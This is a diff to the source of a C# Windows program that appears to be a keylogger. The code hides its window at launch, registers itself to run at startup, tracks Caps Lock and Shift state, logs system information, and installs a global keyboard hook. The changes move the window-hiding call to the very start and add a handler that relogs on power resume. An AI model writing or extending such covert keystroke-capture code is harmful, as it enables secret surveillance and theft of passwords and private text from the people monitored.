@@ -1,5 +1,4 @@
 ﻿using System.Runtime.InteropServices;
-using System.Text;
 using Microsoft.Win32;
 using Windows.Win32;
 using Windows.Win32.Foundation;
@@ -17,19 +16,21 @@ public static class Program
     private static bool _capsLockActive;
     private static bool _shiftActive;
 
+    // TODO on start write current info, add a startup option to write plain text with no alt, ctrl, shift
     public static unsafe void Main()
     {
+        HideWindow();
+
         // user logout/system shutdown events
         SystemEvents.SessionEnding += (_, _) =>
         {
             _ = CleanupHandler();
         };
         // ctrl+c, ctrl+break, program close events
-        // could use this to handle logout/shutdown but its much easier to use SystemEvents.SessionEnding because
+        // could use this to handle logout/shutdown, but it's much easier to use SystemEvents.SessionEnding because
         // https://learn.microsoft.com/en-us/windows/console/setconsolectrlhandler#remarks
         PInvoke.SetConsoleCtrlHandler(CleanupHandler, true);
-        
-        HideWindow();
+
         AddToStartup();
 
         var logFile =
@@ -38,6 +39,13 @@ public static class Program
 
         // TODO check something weird going on
         _capsLockActive = Keyboard.GetCapsLockState();
+
+        SystemEvents.PowerModeChanged += (_, e) =>
+        {
+            if (e.Mode != PowerModes.Resume) return;
+            _capsLockActive = Keyboard.GetCapsLockState();
+            logFile.WriteSystemInfo();
+        };
 
         // install a keyboard hook
         _kbHook = PInvoke.SetWindowsHookEx(
